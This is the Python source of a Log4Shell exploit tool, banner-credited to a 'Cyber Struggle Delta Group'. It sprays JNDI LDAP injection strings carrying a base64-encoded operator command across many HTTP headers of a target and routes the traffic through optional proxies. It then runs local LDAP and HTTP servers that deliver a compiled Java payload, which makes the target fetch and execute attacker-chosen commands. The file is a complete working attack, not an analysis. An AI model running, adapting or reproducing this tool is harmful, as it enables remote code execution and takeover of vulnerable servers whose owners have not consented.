#!/usr/bin/env python3
from utils import *
import argparse
import sys
import os
import requests
import random
import concurrent.futures
import threading
import time
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
logger = logging.getLogger('Log4js')
from urllib.parse import urlparse
from urllib.parse import parse_qs

from http.server import HTTPServer, BaseHTTPRequestHandler

DEFAULT_THREADS = 10

banner = """

    ██╗      ██████╗  ██████╗ ██╗  ██╗███████╗██╗  ██╗███████╗██╗     ██╗     
    ██║     ██╔═══██╗██╔════╝ ██║  ██║██╔════╝██║  ██║██╔════╝██║     ██║     
    ██║     ██║   ██║██║  ███╗███████║███████╗███████║█████╗  ██║     ██║     
    ██║     ██║   ██║██║   ██║╚════██║╚════██║██╔══██║██╔══╝  ██║     ██║     
    ███████╗╚██████╔╝╚██████╔╝     ██║███████║██║  ██║███████╗███████╗███████╗
    ╚══════╝ ╚═════╝  ╚═════╝      ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
                                                                            
        Log4Shell Exploit (Cyber Struggle Delta Group) via @safe_buffer

"""


ALL_PAYLOADS = None
PROXIES_LIST = []
ALL_PAYLOADS = []
LOCALIP = None
SHELL_FLAG = False






def go_clutch(url=None,method="get",data={},headers={}):
    request_headers = {'User-Agent':'Trying to exploit Log4Shell'}
    if headers:
        request_headers.update(headers)
    request_data = {}
    proxies = {}
    if data:
        request_data.update(data)
    request_func = None
    http_timeout = 120

    try:
        request_func = getattr(requests, method.lower())
    except Exception as e:
        exit()

    def do_request(payload={}):
        try:
            reqproxies = {}
            pxomsg = ""
            if len(PROXIES_LIST):
                reqproxies = random.choice(PROXIES_LIST)
            headers = request_headers.copy()
            headers.update(payload)
            req = request_func(url,headers=headers,data=data,timeout=http_timeout,proxies=reqproxies)
        except Exception as e:
            pass

    #testing stage 
    try:
        req0 = request_func(url,headers=headers,data=data,timeout=http_timeout)
    except Exception as e:
        pass
    

    start = time.time()

    processes = []

    with ThreadPoolExecutor(max_workers=DEFAULT_THREADS) as executor:
        for payload in ALL_PAYLOADS:
            processes.append(executor.submit(do_request, payload))



    # print_blue(f'[*] sent all the requests in : {time.time() - start}')



def spray_headers(target_options=None,command=None,args=None):

    global LOCALIP,PROXIES_LIST,ALL_PAYLOADS
    parsed_request = None
    additionalrequest_headers = {}
    additionalrequest_data    = {}

    url                 = target_options['url']
    requestFile         = None
    request_method      = 'get'
    request_headers     = None
    request_data        = None
    additionalheaders   = args.additionalheaders
    proxylist           = args.proxylist

    if proxylist:
        if os.path.exists(proxylist):
            for p in open(proxylist,'r').readlines():
                p = p.replace('\n', '')
                g = p.split(':')
                proxy_object = {
                    'http': f'http://{g[0]}:{g[1]}',
                    'https': f'http://{g[0]}:{g[1]}',
                }
                PROXIES_LIST.append(proxy_object)

    payloads = [
        "Log4Shell-CS ${jndi:ldap://"+str(LOCALIP)+":"+str(args.ldapport)+"/"+base64encoder(command).decode()+"}",
    ]
    headers = prepre_headers(additionalheaders=additionalheaders,
                        known_headers_path=KNOWN_HEADERS_PATH)
    ALL_PAYLOADS = prepare_all(headers=headers,payloads=payloads)

    print_blue(f"[*] Spraying {len(ALL_PAYLOADS)} known HTTP Header")
    
    go_clutch(url=url,method=request_method,data=None,headers=additionalrequest_headers)


class Log4ShellCallbacks(HTTPServer):
    pass

class Log4ShellHTTPHandler(BaseHTTPRequestHandler):
    def log_request(self, code='-', size=''):
        print_blue(f' New HTTP Request {code} {size} ')


    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/octet-stream')
        self.send_header('Server', 'Log4ShellCS Exploit')
        self.end_headers()

    def do_GET(self):
        self._set_response()
        if COOL_CLASS_PATH in self.path:
            bts = open(MAIN_COMPILED,'rb').read()
            with open(MAIN_COMPILED, 'rb') as file:
                bts = file.read()
                self.wfile.write(bts)
                print_green("[+] Sent the final payload your command has been executed right now")
                exit()
        self.wfile.write(b"")

def start_http_server(PORT):
     # Create server
    try:
        server = Log4ShellCallbacks(('', int(PORT)), Log4ShellHTTPHandler)
    except Exception as e:
        print(e)
        exit()

    # Start serving
    try:
        server.serve_forever()
    except Exception as e:
        print(e)
        server.server_close()   
        exit()

def start_ldap_server(ports):
     # Create server
    try:
        START_LDAP_SERVER(LOCALIP,int(ports['ldap']),int(ports['http']))
    except Exception as e:
        print(e)
        exit()







def get_a_life(target_options):
    random_shell_port = random.randint(30000,60000)
    global LOCALIP,SHELL_FLAG
    args = target_options['args']
    LOCALIP = args.localhost
    command = args.command
    x = threading.Thread(target=start_http_server, args=(int(args.httpport),))
    x.start()
    print_blue(f"[*] Started http server on {args.httpport}")
    l = threading.Thread(target=start_ldap_server, args=({'http':args.httpport,'ldap':args.ldapport},) )
    l.start()
    print_blue(f"[*] Started LDAP server on {args.ldapport}")

    spray_headers(target_options,command,args)
    
def main():
    print(banner)
    parser = argparse.ArgumentParser(add_help=True)
    
    target = parser.add_argument_group("Target", "Target and command should be provided")
    target.add_argument("-u", "--target", dest="url",
            help="Target HOST (e.g. \"http://IPAddress\")",required=True)

    target.add_argument("-c", dest="command",
        help="The Command you want to execute on the target",required=True)

    extra_options = parser.add_argument_group("Extra", "Just some extra options")
    extra_options.add_argument("-p", dest="httpport",
        help="HTTP listening port ", default=8080)
    extra_options.add_argument("-l", dest="ldapport",
        help="LDAP listening port ", default=1389)
    extra_options.add_argument("-i", dest="localhost",
        help="HOST IP To use", default=1389,required=True)

    payload_option = parser.add_argument_group("Payloads", "These options can be used to specify payloads")
    payload_option.add_argument("-aH", "--headers-list", dest="additionalheaders",
        help="Load Extra header(s) keys from text file")
    payload_option.add_argument("-aL", "--proxies", dest="proxylist",
        help="Load proxies from text file ip:port")


    (args, _) = parser.parse_known_args(sys.argv)

    if not any((args.url)):
        errMsg = "missing a mandatory option (-u) for url. "
        errMsg += "Use -h for help\n"
        parser.error(errMsg)
    else:

        target_options = {
            'url':args.url,
            'args':args
        }

        get_a_life(target_options)

if __name__ == "__main__":
    main()


